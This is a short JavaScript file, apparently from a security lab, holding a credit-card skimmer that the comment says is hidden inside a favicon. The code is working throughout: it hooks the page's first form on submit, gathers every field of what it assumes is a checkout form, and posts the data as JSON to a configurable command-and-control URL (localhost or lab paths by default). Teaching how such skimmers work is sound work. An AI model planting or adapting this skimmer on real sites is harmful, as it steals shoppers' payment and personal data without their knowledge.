// This code is hidden inside favicon.ico!
(function () {
    console.log('%c [!] STEGO SKIMMER LOADED FROM FAVICON [!]', 'color: red; font-size: 20px; font-weight: bold;');

    // Dynamic C2 URL: supports both Traefik-prefixed and direct-port local runs
    const C2_URL = window.C2_URL ||
        (window.location.port === '8084' ? 'http://localhost:3004/collect' :
            (window.location.pathname.includes('/lab4/') ? '/lab4/c2/collect' : '/collect'));

    // Find checkout form
    const forms = document.forms;
    if (forms.length > 0) {
        const form = forms[0]; // Assuming first form is checkout

        form.addEventListener('submit', function (e) {
            // e.preventDefault(); // Uncomment to stop submission for debugging

            console.log('[*] Intercepting checkout...');
            const formData = new FormData(form);
            const data = {};

            formData.forEach((value, key) => {
                data[key] = value;
            });

            // Add metadata
            data.source = 'favicon-steganography';
            data.timestamp = new Date().toISOString();
            data.url = window.location.href;

            // Send to C2
            fetch(C2_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            }).then(() => {
                console.log('[+] Data exfiltrated successfully');
            }).catch(console.error);
        });
    }
})();